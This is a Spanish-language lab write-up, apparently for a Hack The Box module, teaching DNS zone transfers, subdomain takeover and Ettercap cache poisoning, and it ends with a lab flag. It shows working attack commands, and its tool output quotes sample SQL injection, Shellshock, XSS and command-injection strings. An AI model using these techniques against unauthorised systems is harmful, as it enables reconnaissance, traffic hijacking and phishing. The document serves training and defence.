---
title: "Attacking DNS"
date: 2026-04-14 10:00:00 -0400
categories: [Write-up]
tags: [dns, zone-transfer, subdomain-takeover, cache-poisoning, ettercap, nmap, dig]
description: "Ataques al protocolo DNS: enumeración, zone transfer, subdomain takeover y DNS Cache Poisoning con Ettercap."
media_subpath: /assets/img/posts/2026-04-15-dns-attacks
image:
  path: 1776287502586.webp
featured: false
toc: true
---
# ¿Qué es el DNS?

Cuando escribes `google.com` en tu navegador, tu computador no sabe a qué servidor conectarse. Las computadoras solo entienden números (IPs), no nombres. Entonces ocurre esto:

```texplain
Tú escribes: google.com
     ↓
Tu PC le pregunta al servidor DNS: "¿cuál es la IP de google.com?"
     ↓
El DNS responde: "es 142.250.80.46"
     ↓
Tu navegador se conecta a 142.250.80.46
     ↓
Ves Google
```

El DNS es básicamente la **guía telefónica de Internet**. Tú buscas el nombre, él te da el número. Toda esa información se almacena en **registros DNS**, los más relevantes para estos ataques son:

| Registro | Para qué sirve | Ejemplo |
|----------|---------------|---------|
| `A` | Apunta un nombre a una IP | `google.com → 142.250.80.46` |
| `CNAME` | Apunta un nombre a otro nombre (alias) | `support.empresa.com → bucket.s3.amazonaws.com` |
| `NS` | Indica qué servidor DNS es el responsable de la zona | `empresa.com → ns1.empresa.com` |
| `SOA` | Registro de inicio de la zona, contiene metadatos | versión, TTL, email del admin |
| `MX` | Servidor de correo del dominio | `empresa.com → mail.empresa.com` |

> DNS opera por defecto sobre **UDP/53**, pero usa **TCP/53** para transferencias de zona por su mayor fiabilidad.
{: .prompt-info }

---

# Introducción

<div class="attack-grid">
  <div class="attack-card">
    <div class="atk-id">[ATK-01]</div>
    <h3>Zone Transfer</h3>
    <p>Servidor DNS mal configurado entrega su base de datos completa a cualquiera que la solicite sin autenticación.</p>
  </div>
  <div class="attack-card">
    <div class="atk-id">[ATK-02]</div>
    <h3>Subdomain Takeover</h3>
    <p>Registro CNAME apunta a un servicio externo expirado que puede ser reclamado por el atacante.</p>
  </div>
  <div class="attack-card">
    <div class="atk-id">[ATK-03]</div>
    <h3>DNS Cache Poisoning</h3>
    <p>Posición MITM en la red local permite responder consultas DNS con IPs falsas antes que el servidor legítimo.</p>
  </div>
</div>

---

# Enumeración

Antes de atacar, confirmamos que el servidor DNS está activo y obtenemos su versión:

```shell
╰─ nmap -p53 -Pn -sV -sC 10.129.203.6

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
Nmap scan report for 10.10.110.213
Host is up (0.017s latency). 
 
PORT    STATE  SERVICE  VERSION 
53/tcp  open   domain   ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

| Flag   | Qué hace                                                  |
| ------ | --------------------------------------------------------- |
| `-p53` | Solo escanea el puerto 53, que es el puerto del DNS       |
| `-Pn`  | No hace ping previo, asume que el host está activo        |
| `-sV`  | Detecta la versión del servicio (ej: ISC BIND 9.11.3)     |
| `-sC`  | Ejecuta scripts automáticos de Nmap para obtener más info |

Si el puerto aparece como `open`, el servidor DNS está activo. La versión del servicio puede revelar CVEs conocidos, así que conviene anotarla siempre.

> Versiones antiguas de ISC BIND tienen vulnerabilidades públicas documentadas. Busca el string de versión en `searchsploit bind` antes de continuar.
{: .prompt-tip }

---

# Explotación

### ATK-01 — Zone Transfer (AXFR)

Una empresa grande no tiene un solo servidor DNS. Tiene varios: uno principal y uno o más de respaldo, por si el principal cae. El problema es que todos deben tener la misma información. Para sincronizarse usan una **Zone Transfer**: el servidor secundario le dice al primario *"dame una copia de todos tus registros"*, y el primario se los envía.

El servidor primario debería verificar quién le hace esa petición y entregarla solo a sus propios servidores secundarios. Pero muchos administradores no configuran eso correctamente:

```texplain
Situación normal:
DNS secundario → "dame tus registros" → DNS primario
DNS primario   → "eres de confianza, toma" → entrega todo ✓

Situación vulnerable:
Tú (atacante)  → "dame tus registros" → DNS primario
DNS primario   → "claro, toma" → te entrega todo ✗
```

Con una sola petición obtienes un inventario completo de la infraestructura interna: subdominios, IPs, servidores de correo y más.

> Si el servidor no restringe qué IPs pueden solicitar una transferencia de zona, cualquier atacante puede obtener el mapa completo de la red interna con una sola consulta.
{: .prompt-danger }

```shell
╰─ dig AXFR @10.129.56.120 inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213 
;; global options: +cmd 
inlanefrieght.htb.         604800  IN  SOA    localhost. root.localhost. 2 604800 86400 2419200 604800 
inlanefrieght.htb.         604800  IN  AAAA   ::1 
inlanefrieght.htb.         604800  IN  NS     localhost. 
inlanefrieght.htb.         604800  IN  A      10.129.110.22 
admin.inlanefrieght.htb.   604800  IN  A      10.129.110.21 
hr.inlanefrieght.htb.      604800  IN  A      10.129.110.25 
support.inlanefrieght.htb. 604800  IN  A      10.129.110.28 
inlanefrieght.htb.         604800  IN  SOA    localhost. root.localhost. 2 604800 86400 2419200 604800 
;; Query time: 28 msec 
;; SERVER: 10.129.110.213#53(10.129.110.213) 
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

| Flag                     | Qué hace                                                      |
| ------------------------ | ------------------------------------------------------------- |
| `dig`                    | Herramienta de Linux para hacer consultas DNS manualmente     |
| `AXFR`                   | Tipo de consulta: solicita una transferencia de zona completa |
| `@ns1.inlanefreight.htb` | El `@` indica a qué servidor DNS le preguntas directamente    |
| `inlanefreight.htb`      | El dominio del que quieres todos los registros                |

Cada línea del output se lee así:

```
[nombre del host]   [TTL en segundos]  IN  [tipo]  [IP]
admin.empresa.htb      604800          IN    A    10.129.110.21
     ↑                   ↑                   ↑         ↑
  subdominio       cuánto tiempo se      tipo A =   la IP a la
  encontrado       guarda en caché       dirección  que apunta
```

También puedes usar **Fierce**, que automatiza el intento de AXFR contra todos los nameservers del dominio y hace fuerza bruta de subdominios si falla:


```shell
╰─ fierce --domain zonetransfer.me

NS: nsztm1.digi.ninja. nsztm2.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
               '172800 900 1209600 3600\n'
               '@ 7200 IN DNSKEY 256 3 7 AwEAAapoL+InQBYx2oi3dI424+dEDFgn '
               '@ 301 IN TXT '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n'
               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"',
 <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',
 <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '
                                       'www',
 <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',
 <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',
 <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',
 <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',
 <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
 <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
                     'DNS changes"',
 <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',
 <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',
 <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',
 <DNS name DZC>: 'DZC 7200 IN TXT "AbCdEfG"',
 <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email 7200 IN A 74.125.206.26',
 <DNS name Hello>: 'Hello 7200 IN TXT "Hi to Josh and all his class"',
 <DNS name home>: 'home 7200 IN A 127.0.0.1',
 <DNS name Info>: 'Info 7200 IN TXT "ZoneTransfer.me service provided by Robin '
                  'Wood - robin@digi.ninja. See '
                  'http://digi.ninja/projects/zonetransferme.php for more '
                  'information."',
 <DNS name internal>: 'internal 300 IN NS intns1\ninternal 300 IN NS intns2',
 <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',
 <DNS name intns2>: 'intns2 300 IN A 5.196.105.10',
 <DNS name office>: 'office 7200 IN A 4.23.39.254',
 <DNS name ipv6actnow.org>: 'ipv6actnow.org 7200 IN AAAA '
                            '2001:67c:2e8:11::c100:1332',
 <DNS name owa>: 'owa 7200 IN A 207.46.197.32',
 <DNS name robinwood>: 'robinwood 302 IN TXT "Robin Wood"',
 <DNS name rp>: 'rp 321 IN RP robin robinwood',
 <DNS name sip>: 'sip 3333 IN NAPTR 2 3 "P" "E2U+sip" '
                 '"!^.*$!sip:customer-service@zonetransfer.me!" .',
 <DNS name sqli>: 'sqli 300 IN TXT "\' or 1=1 --"',
 <DNS name sshock>: 'sshock 7200 IN TXT "() { :]}; echo ShellShocked"',
 <DNS name staging>: 'staging 7200 IN CNAME www.sydneyoperahouse.com.',
 <DNS name alltcpportsopen.firewall.test>: 'alltcpportsopen.firewall.test 301 '
                                           'IN A 127.0.0.1',
 <DNS name testing>: 'testing 301 IN CNAME www',
 <DNS name vpn>: 'vpn 4000 IN A 174.36.59.154',
 <DNS name www>: 'www 7200 IN A 5.196.105.14',
 <DNS name xss>: 'xss 300 IN TXT "\'><script>alert(\'Boo\')</script>"'}
```

| Flag       | Qué hace                                                            |
| ---------- | ------------------------------------------------------------------- |
| `fierce`   | Busca los NS del dominio e intenta AXFR en cada uno automáticamente |
| `--domain` | El dominio objetivo                                                 |

> Si el servidor valida la IP solicitante, el AXFR fallará. En ese caso, pasar directamente a enumeración de subdominios con Subfinder o Subbrute.
{: .prompt-warning }

---

### ATK-02 — Subdomain Takeover

Un registro **CNAME** es un alias DNS: en lugar de apuntar a una IP, apunta a otro nombre de dominio. Ejemplo:

```textplain
support.inlanefreight.com  →  CNAME  →  inlanefreight.s3.amazonaws.com
```

La empresa usó un bucket de AWS S3 para hospedar su página de soporte y creó ese alias. Ahora imagina que la empresa **elimina el bucket**, pero **se olvida de borrar el registro CNAME**. El DNS sigue redirigiendo tráfico hacia un recurso que ya no existe:

```textplain
Antes (normal):
Usuario → support.inlanefreight.com → bucket AWS (empresa) → página real

Después de eliminar el bucket (vulnerable):
Usuario → support.inlanefreight.com → bucket AWS (TUYO) → lo que tú quieras
```

Basta con crear un bucket de S3 con ese mismo nombre en tu cuenta para tomar control del subdominio. La URL en el navegador sigue diciendo `support.inlanefreight.com`, el dominio legítimo de la empresa, pero sirve tu contenido.

**Paso 1 — Enumerar subdominios con Subfinder** (requiere Internet):

Para instalar la herramienta se usa el siguiente comando:

```shell
╰─ sudo apt install subfinder
```

Para ejecutarla es así:

```shell
╰─ subfinder -d inlanefreight.com -v
       _     __ _         _                                           
 ____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5
                     projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used.

[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```

| Flag | Qué hace                                                    |
| ---- | ----------------------------------------------------------- |
| `-d` | El dominio que quieres enumerar                             |
| `-v` | Verbose: muestra de qué fuente OSINT obtuvo cada subdominio |

Subfinder no hace fuerza bruta. Consulta bases de datos públicas donde ya están registrados esos subdominios: certificados SSL, motores de búsqueda, DNSdumpster, AlienVault, etc.l

**Paso 1 alternativo — Subbrute** (para redes internas sin Internet):herd 

```shell
# Clonar repositorio
╰─ git clone https://github.com/TheRook/subbrute.git

# Entramos al directorio
╰─ cd subbrute

# Introducimos la IP objetivo en los resolvers
╰─ echo "10.129.56.120" > resolvers.txt

# Ejecutamos subbrute.py
╰─ python3 subbrute.py inlanefreight.com -s names.txt -r ./resolvers.txt
```

| Flag | Qué hace |
|------|----------|
| `-s ./names.txt` | Diccionario de nombres a probar: `admin`, `vpn`, `mail`, `dev`, etc. |
| `-r ./resolvers.txt` | El servidor DNS interno que usará para resolver |

> Subbrute es ideal para pivoting: apunta `-r` a un DNS interno y descubres hosts que nunca serían visibles desde fuera de la red.
{: .prompt-tip }

**Paso 2 — Verificar si algún subdominio apunta a un servicio expirado:**

```shell
╰─ host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

| Parte                       | Qué hace                                        |
| --------------------------- | ----------------------------------------------- |
| `host`                      | Herramienta de resolución DNS desde la terminal |
| `support.inlanefreight.com` | El subdominio que quieres verificar             |

Si ves un alias CNAME apuntando a un servicio de terceros (AWS, GitHub, Heroku, etc.), visitas la URL en el navegador. Si ves el error `NoSuchBucket` o equivalente, el recurso está expirado y el subdominio es vulnerable.

![](1776291226613.webp)

> El repositorio [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) lista todos los servicios vulnerables a subdomain takeover con guías específicas para cada proveedor.
{: .prompt-info }

---

### ATK-03 — DNS Cache Poisoning con Ettercap

Cada vez que tu computador resuelve un dominio, guarda la respuesta temporalmente en memoria. Esto se llama **caché DNS**:

```textplain
Primera vez:
Tu PC → "¿cuál es la IP de google.com?" → DNS → "142.250.80.46"
Tu PC guarda en caché: google.com = 142.250.80.46

Segunda vez:
Tu PC → revisa caché → "ya sé que es 142.250.80.46" → se conecta directo
```

El ataque consiste en **meter una respuesta falsa en ese caché**. Si logramos que la víctima guarde `inlanefreight.com = NUESTRA_IP`, cada vez que intente visitarlo llegará a nuestro servidor. Para hacer esto, primero nos posicionamos como **MITM** entre la víctima y el router con ARP Poisoning:

```textplain
Sin MITM:
Víctima ←→ Router ←→ Internet

Con MITM (Ettercap):
Víctima ←→ TÚ ←→ Router ←→ Internet
              ↑
     Interceptas TODO el tráfico,
     incluyendo las consultas DNS
```

**Paso 1 — Configurar los dominios a falsificar:**

Editamos `/etc/ettercap/etter.dns` y añadimos:

```shell
╰─ cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

| Parte | Qué hace |
|-------|----------|
| `inlanefreight.com` | Dominio que vamos a falsificar |
| `A` | Tipo de registro DNS (dirección IPv4) |
| `192.168.225.110` | Nuestra IP: hacia donde redirigimos el tráfico |
| `*.inlanefreight.com` | Comodín que cubre todos los subdominios también |

**Paso 2 — Escanear la red y configurar targets:**

En Ettercap: `Hosts > Scan for Hosts`. Esto hace un ARP scan y lista todos los dispositivos activos en la red. Luego:

- IP víctima (`192.168.152.129`) → **Add to Target 1**
- IP del gateway (`192.168.152.2`) → **Add to Target 2**

Agregas el gateway porque el ARP Poisoning funciona en ambas direcciones: engañas a la víctima haciéndole creer que tú eres el router, y al router haciéndole creer que tú eres la víctima. Así quedas en el medio.

![](1776295345669.webp)

**Paso 3 — Activar el plugin dns_spoof:**
`Plugins > Manage Plugins` → activar **dns_spoof**.

![](1776295353675.webp)

Cuando ve una consulta DNS de la víctima que coincide con lo definido en `etter.dns`, la intercepta y responde con nuestra IP falsa antes de que llegue la respuesta real del servidor DNS.

**Paso 4 — Verificar desde la máquina víctima:**

```cmd
ping inlanefreight.com
```

![](1776295368111.webp)

Si el dominio resuelve a nuestra IP en lugar de la IP legítima, el ataque funcionó. Cualquier visita al dominio desde esa máquina llega a nuestro servidor.

> Bettercap es una alternativa más moderna y silenciosa a Ettercap para este tipo de ataques.
{: .prompt-tip }

> Ettercap genera ruido considerable en la red. En entornos con IDS/IPS activo la detección es prácticamente inmediata.
{: .prompt-warning }

> Solo realizar este ataque en entornos de laboratorio o con autorización explícita. El envenenamiento de caché DNS sin permiso es ilegal.
{: .prompt-danger }

---

# Resumen

Los tres ataques se encadenan en una progresión lógica dentro de un pentest real:

```
1. ENUMERACIÓN
   nmap -p53 → confirmo que hay un servidor DNS
        ↓
2. ZONE TRANSFER
   dig AXFR → intento obtener el mapa completo de la red
        ↓
   Si funciona: tengo todos los subdominios e IPs → nuevos objetivos
        ↓
3. SUBDOMAIN TAKEOVER
   subfinder / subbrute → enumero subdominios
   host [subdominio]    → busco CNAMEs apuntando a servicios externos
        ↓
   Si encuentro uno expirado → lo registro → controlo el subdominio
        ↓
4. CACHE POISONING (red local)
   Ettercap MITM → intercepto consultas DNS de la víctima
        ↓
   Respondo con IPs falsas → redirijo tráfico a mi servidor
```

| Técnica | Requisito | Impacto | Ruido |
|---------|-----------|---------|-------|
| Zone Transfer (AXFR) | Servidor DNS sin restricción de IPs | Mapa completo de infraestructura | Bajo |
| Subdomain Takeover | CNAME apuntando a servicio expirado | Control de subdominio legítimo | Bajo |
| DNS Cache Poisoning | Posición MITM en la red local | Redirección de tráfico / phishing | Medio |

---

# Write-up: Attacking DNS
  
## Pregunta 1: Encuentre todos los registros DNS disponibles para el dominio "inlanefreight.htb" en el servidor de nombres de destino y envíe el indicador encontrado como registro DNS como respuesta.

Primero escaneamos el DNS objetivo:
```shell
nmap -p53 -sV -sC 10.129.203.6
```

![](1776287349489.webp)
**Resultado:**
- Puerto 53 abierto
- ISC BIND 9.16.1
- Servidor DNS Autoritativo
  
El escaneo confirmó que el puerto 53 estaba abierto y ejecutando **ISC BIND 9.16.1**. Lo más crítico de esta salida fue confirmar que se trataba de un **Servidor DNS Autoritativo** que por defecto, aloja los archivos de zona originales.

- **Servidor DNS Autoritativo**: Es el responsable final de almacenar los registros oficiales (como direcciones IP) de un dominio. Actúa como la fuente primaria de verdad, proporcionando respuestas directas a los servidores recursivos para traducir nombres de dominio en IPs. A diferencia de los servidores recursivos no suelen depender de cachés.

Al saber esto intenté una transferencia de zona completa para obtener los archivos de zona originales:

```shell
dig AXFR inlanefreight.htb @10.129.203.6
```

![](1776650650104.webp)
**Resultado:** Transferencia fallida.

Esto demostró que el administrador del sistema configuró correctamente la seguridad en el dominio raíz (`inlanefreight.htb`), restringiendo las peticiones AXFR únicamente a servidores de confianza.

Consulté el registro del Servidor de Nombres (NS).

```shell
dig NS inlanefreight.htb @10.129.203.6 
```

![](1776650926909.webp)
**Resultado**: `ns.inlanefreight.htb`

El servidor respondió que el registro NS (`ns.inlanefreight.htb`) resolvía a la dirección IP `127.0.0.1` (localhost). Esto sugiere que las reglas del firewall o del servicio DNS están configuradas para confiar ciegamente en el tráfico local o que las transferencias de zona solo están permitidas si se originan desde el propio servidor.

Si el dominio Raíz estaba bloqueado, el siguiente paso es enumerar los subdominios que no se hayan asegurado correctamente. Dado que la recursión del DNS estaba desactivada, opté por un ataque de fuerza bruta sobre subdominios con `subbrute.py` 

Primero, configuré la herramienta para que dirigiera todas sus consultas al servidor objetivo:
```shell
echo "10.129.203.6" > resolvers.txt
```

Luego, inicié la fuerza bruta utilizando un diccionario de nombres comunes:
```
python3 subbrute.py -p inlanefreight.htb -s ./names.txt -r ./resolvers.txt
```

![](1776297799509.webp)
**Resultado:** `hr.inlanefreight.htb`

La existencia de un departamento de Recursos Humanos (HR) en un subdominio separado presentaba una nueva superficie de ataque.

Apostando a que el subdominio `hr` no heredó las restricciones de la zona raíz, lancé nuevamente un ataque `AXFR` al subdominio.

```shell
dig AXFR hr.inlanefreight.htb @10.129.203.6
```

![](1776298497076.webp)
**Resultado**: `HTB{LUIHNFAS2871SJK1259991}`

**Éxito.** El servidor procesó la petición y volcó la totalidad de los registros de la zona `hr.inlanefreight.htb`. Esto confirmó la vulnerabilidad: El subdominio no estaba correctamente segmentado con las políticas de seguridad de el dominio principal y las sub-zonas.

### **🚩Flag 1**: 
```textplain
HTB{LUIHNFAS2871SJK1259991}
```

---

# Conclusión

El DNS es un protocolo fundamental que, cuando está mal configurado o no se monitorea adecuadamente, se convierte en una de las fuentes de información más ricas para un atacante. Una zone transfer expone toda la infraestructura interna con una sola consulta, un subdomain takeover permite servir contenido malicioso bajo un dominio de confianza, y el cache poisoning redirige el tráfico de cualquier host en la red local.

Entender estos vectores es esencial tanto para atacar como para defender: restringir las transferencias de zona a IPs autorizadas, auditar periódicamente los registros CNAME activos y monitorear el tráfico DNS son contramedidas básicas que muchas organizaciones aún no implementan correctamente.